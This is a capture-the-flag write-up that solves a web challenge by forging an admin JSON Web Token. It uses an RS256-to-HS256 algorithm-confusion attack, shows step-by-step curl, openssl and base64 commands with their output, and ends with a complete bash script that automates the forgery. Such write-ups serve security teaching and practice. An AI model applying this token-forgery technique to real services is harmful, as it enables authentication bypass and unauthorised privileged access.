# Web Challenge 3: Unlock Me

## Challenge Description
![Challenge Desciption](pics/challenge_desc.jpg)

## Initial Observations

Accessing the [Admin Panel](http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/) brings us to a simple login page

![login_page](pics/login_page.jpg)

Attempting to log in via the stolen credentials, username ```minion``` and password ```banana``` 
- returns us an error ```Only admins are allowed into HQ!```

Opening up DevTools (F12), in the network tab, we can see that upon submiting the login form, there were a total of two requests made, one to ```login``` and another to ```unlock```

![2 requests made](pics/two_requests.jpg)

The request to ```login``` simply does what its name implies, attempt to login! By submitting the imput username and password (in the JSON format), as a POST request.

![login_post](pics/login_post.jpg)

Our client then recieves a JSON response containing an access token

![Access Token](pics/access_token.jpg)

The request to ```unlock``` utilizes the access token received, as a Authorization [Bearer token](https://oauth.net/2/bearer-tokens/) in its request

![pics](pics/bearer_token.jpg)

Doing a simple Google search on Bearer tokens OAuth authentication, the first thing you will see is the use of structured tokens such as [JSON Web Tokens](https://jwt.io/introduction/) (JWT) 

JWT's structure consists of three sections, separated by dots (.), and encoded using **Base64Url**
- Header
- Payload
- Signature

> e.g. aaaa.bbbb.cccc

Viewing the login page's source for any hints or comments reveals a possbile existence of a ```public.pem``` file

![Page Source](pics/page_source.jpg)

Browsing to ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem```, we were able to download the public key

To confirm our hunch of the use of JWT authentication, we took the first and second sections of the JWT and Base64 decoded it
```bash
# First section of JWT
redfl4g@kali$ echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
{"alg":"RS256","typ":"JWT"}

# Second section of JWT
redfl4g@kali$ echo "eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NDI0MjAxfQ" | base64 -d
{"username":"minion","role":"user","iat":1607424201}
```

Based on the above observations, we can conclude that 
- this login feature uses JWT token authentication
- the algorithm used to sign the JWT tokens is "RS256"
- the "RS256" algorithm is an asymmetric encryption method, which uses a pair of separate keys to encrypt and decrypt data
- the token we received is signed by the server's private key

Read more about [JWT Signing Algorithms](https://www.loginradius.com/blog/async/jwt-signing-algorithms/)

<br>

## Solution
There are a number of different types of [JWT attacks](https://apisecurity.io/issue-56-common-jwt-attacks-owasp-api-security-top-10-cheatsheet/) to be used. However, based on the information we've gathered, a JWT Downgrade Attack attack seemed to be the most applicable one to meet our current objective of successfully authenticating as an admin.

Things to note before conducting a JWT Downgrade Attack
- The **JWT Header**, the first section of the JWT token, specifies the Signing Algorithm used (e.g. HS256/RS256)
- The **JWT Paylod**, the second section of the JWT token, contains specific information depending on the design of how the web application processes the information
- The **JWT Signature**, the third and final section
	- if the HS256 signing algorithm is used, the signature is generated from a **shared secret key** (HMAC with SHA256)
	- if the RS256 signing algorithm is used, the signature is generated from a **private key** (RSA with SHA256)


> For RS256, the public key is used by clients to validate the signature, hence the public key is often made publically available

> Read more: [RS256 vs HS256](https://stackoverflow.com/questions/39239051/rs256-vs-hs256-whats-the-difference)

| **Problem**                                                                                                                                                                                                                                                                                                                                                           |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| The objective of this challenge is to sign in as an ***admin***, instead of a ***user***. To do this, we would have to modify the JWT Payload. But when we modify the JWT Payload, we are required to resign the JWT for it to be a valid JWT as the signature's (SHA256 hash portion) will be different, integrity checks will fail resulting in an invalid JWT |
| To resign a RS256 JWT, we will need the target's private key, which is not accessible to us                                                                                                                                                                                                                                                                           |
| Hence, a JWT Downgrade attack might work to meet our objective, by signing the JWT with the HS256 algorithm, using the target's public key, tricking the target to accecpt the resigned JWT as a valid token                                                                                                                                                                           |

<br>
 
### JWT Downgrade Attack

The [JWT Downgrade Attack](https://www.nccgroup.com/uk/about-us/newsroom-and-events/blogs/2019/january/jwt-attack-walk-through/) works by tricking the target's JWT processing to accept a symmetrically signed token (HS256) instead of an asymmetrically signed one (RS256). This works for vulnerable endpoints that uses its public key (which we have) to verify the JWT in a symmetric fashion.

| **Step** | **Explanation**                                                                                                                                                                                                                                                                                           |
|----------|-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| 1        | Retrieve a JWT |
| 2        | Base64Url decode and modify the algorithm specified in the JWT Header to ```HS256```, then Base64Url encode the result |
| 3        | Base64Url decode and modify the "role" specified in the JWT Payload to ```admin```, then Base64Url encode the result| 
| 4        | Piece together the Base64Url encoded JWT Header and Payload, separating the header and payload with a dot (.), and we're now ready to sign this token with the target's public key|
| 5        | Retrieve and save the public key from ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem```                                                                                                                                                                                        |
| 6        | Convert the public key into an ASCII hex HMAC |
| 7        | Sign the token from **Step 4** using the result from **Step 6**. This will result in an ASCII hex HMAC Signature|
| 8| Encode the ASCII hex HMAC Signature from **Step 7**. The result will be the JWT Signature (third section) of your new JWT|
| 9 | Piece together your JWT, appending the JWT Signature from **Step 8** to your JWT Header and JWT Payload|
| 10 | Submit the token as a Bearer token to the endpoint ```http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock``` and retrieve the flag!|

#### Step 1
```bash
redfl4g@kali$ curl -X POST -H "content-type: application/json" -d '{"username":"minion", "password":"banana"}' http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/login

{"accessToken":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NDI0MjAxfQ.xjcF9pd6qCfVHHuTkbyk3oaXhRvngpYqDHNt_JTzDKM9OpMMPlXd0e5eIwBIUSSwY027btjMAukTgrwIb6bNMJBhEMzp9dfgUeeq87b4GGqOQP0MBUSEyXE-41bsvCvw0P7roVspUvFOxVIUtt8HekE2tE9xGcriYy5d-4T7a3V7WhsT7ECFg62X3hXqj_vOW9SRyhWGEKkvhViU4ehxcUvDqpWgoxlbRFVjKlopxP5rQODzLHunPiHF195B5Je2Rd9EtcODHYZYgC17PmH-5n1QEt4wG4WhIyItrkTVZY3mOCoembq9VSJnEUuxR8sSHcsIln7gKJKcLZ_2tjaNb7EYA5x2LyTevVulaMNlKQL9k_eGeBxhiBqIK_8qR5JeQvRi6uuLWjeBp_m5jKjc75yUldV3EPpOYlH1_VZ7UIIGBnUZVROvRhWvL9O_kkva8WjhsEs6ZeHpCRu3J6nTWIPUzUhvVuT8iN-wJ-FjRYst_zZombbBH0L5RGEulrEfvzNKX_VVo1YIsYWxJM27DUeDFJk2O80D5bJ5-b3fMmWK3wlUrpKon8YOzop04xbVAfbfASgtHiALz_FHtnuQx5uTY1PcBMJa3zCaTv4giKZip2vpQ70qJMpcURBealC8Zu6VwY2W8K9xI9NbDXcy4dGG0gNa3mUPDDOAxPp3e_o"}
```

#### Step 2
```bash
redfl4g@kali$ echo "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9" |  base64 -d | sed 's/+/-/g; s/\//_/g; s/RS256/HS256/g';

{"alg":"HS256","typ":"JWT"}
```
Use an online Base64Url encoder to encode the modified JWT header to get ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9```

![Header B64Url encode](pics/b64url_encode.jpg)

#### Step 3
```bash
redfl4g@kali$  echo "eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNjA3NDI0MjAxfQ" |  base64 -d | sed 's/+/-/g; s/\//_/g; s/:"user/:"admin/g';

{"username":"minion","role":"admin","iat":1607424201}
```
Use an online Base64Url encoder to encode the modified JWT payload to get ```eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0```

![Payload B64Url encode](pics/b64url_encode2.jpg)

#### Step 4 
Base64Url encoded JWT Header and Payload
- ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0```

#### Step 5
```bash
redfl4g@kali$ wget http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem
```

#### Step 6
```bash
redfl4g@kali$ cat public.pem | xxd -p | tr -d "\\n"

2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454134436f74316d4d30654635635a556e69664b78300a384d4a5135397569392f38444c7a57705757746c504773423454395573614173706e645a4a61666247467130762b76477a472b546c744a6a6231762b74546a380a737146616e632f4b5764515a723357776d7568553935454a3752526874454978544e38526e314b4f4b55715a2f506c6d66344c724d724d5a6d363644716154570a48326d7935495253684b30693059707a6954394a4565564a74532f7a432b55556462496d724f61766a443450445a763134464c457565504d4e306d434e6351350a7a3569535176356a386e706274764d426265414b4d76597943654963686a57323244702f744e69347866493743615479507030704f332b4d5a39764a384f30320a594f43372f2b745158324e64766556754b594567345854512f6e6d6959534b39446558794f2f45476b517a785a6a704c76355a4d4e30374e6175327870516f470a314970345966444135592f4d6a41387144674e4e306e2f706d42615042484e76464b366d574a6c6c6e754f6e4c70514843785a4e7842756478544c536f586b710a585150524b63645a706276306b6a742f5a70776b6f584866514c546f4a795a51675158744548615733364b6f39586a71336344577a6b536a41444d7861712f350a38535a7650556b6e6d334d76394b4e387a596965505947556c32614c794b756d4b462b2b726c68376136784a676342637331306266307979655255334e5757620a30707a3464676472676832735872672f5535315668656a6e4e66766652662b34437931514d345157624b585a6b39734c744c706b66696f752f72693359556e330a7478496766594b61376135744f744257535248486c484f6d53353841623531706d5347646a496543612b574d6965306935726575526236574a32376a6e764a460a4730687974414242624367654c3030796d4a4b31367455434177454141513d3d0a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a
```

#### Step 7
```bash
redfl4g@kali$ echo -n "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$(cat public.pem | xxd -p | tr -d "\\n")

2d2912499e8b63e86d73bbe51f76deca6f896939d1afc7a05337eded412310d4
```

#### Step 8
```bash
redfl4g@kali$ python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('2d2912499e8b63e86d73bbe51f76deca6f896939d1afc7a05337eded412310d4')).replace('=','')\")"

LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ
```


#### Step 9
Signed and modified JWT Token
- ```eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0.LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ```

#### Step 10
```bash
redfl4g@kali$ curl -X GET -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1pbmlvbiIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTYwNzQyNDIwMX0.LSkSSZ6LY-htc7vlH3beym-JaTnRr8egUzft7UEjENQ" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock

{"flag":"govtech-csg{5!gN_0F_+h3_T!m3S}"}
```
> Note: The "iat" parameter specified in the JWT Payload is an ["Issued at" Claim](https://tools.ietf.org/html/rfc7519#page-10). This means that there is a possibility that JWT tokens are also verified based on their age, and can expire, thereby invalidating the token 

<br>

### Bonus
![Automate](pics/automate.jpg)

Doing the above steps might be a tad bit overwhelming and tedious, therefore i've written a simple standalone bash script that does it all in one go.

```bash
#!/bin/bash

function base64url_encode {
	(if [ -z "$1" ]; then cat -; else echo -n "$1"; fi) |
		openssl base64 -e -A |
			sed s/\\+/-/g |
			sed s/\\//_/g |
			sed -E s/=+$//
}

function base64url_decode {
	INPUT=$(if [ -z "$1" ]; then echo -n $(cat -); else echo -n "$1"; fi)
	MOD=$(($(echo -n "$INPUT" | wc -c) % 4))
	PADDING=$(if [ $MOD -eq 2 ]; then echo -n '=='; elif [ $MOD -eq 3 ]; then echo -n '=' ; fi)
	echo -n "$INPUT$PADDING" |
		sed s/-/+/g |
		sed s/_/\\//g |
		openssl base64 -d -A
}

# Public Key
PB=$(curl http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/public.pem 2> /dev/null| xxd -p | tr -d "\\n")

# Original Token 
ori_token=$(curl -X POST -H "Content-Type: application/json" -d '{"username":"minion","password":"banana"}' http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/login 2> /dev/null | cut -d ":" -f2 | sed 's/"//g' | sed 's/}//g' | cut -d "." -f1-2) 

# Token Header
hs_start=$(echo $ori_token | cut -d "." -f1 | base64 -d 2> /dev/null | sed 's/RS256/HS256/g' | base64url_encode)

# Token Payload
token=$(echo $ori_token | cut -d "." -f2 | base64 -d 2> /dev/null | sed 's/:"user/:"admin/g' | base64url_encode)

# Raw HMAC Signature
raw_hmac_sig=$(echo -n "$hs_start.$token" | openssl dgst -sha256 -mac HMAC -macopt hexkey:$PB | cut -d '=' -f2 | xargs)

# Base64Url encoded JWT signature
hmac_sig=$(python -c "exec(\"import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex('$raw_hmac_sig')).replace('=','')\")")

# Resigned JWT Token
resigned_token=$hs_start.$token.$hmac_sig

echo -e "Header: $(base64url_decode $hs_start)\n"
echo -e "Payload: $(base64url_decode $token)\n"
echo -e "Signed Token: $resigned_token\n"

# Get flag
curl -H "Authorization: Bearer $resigned_token" http://yhi8bpzolrog3yw17fe0wlwrnwllnhic.alttablabs.sg:41031/unlock
```

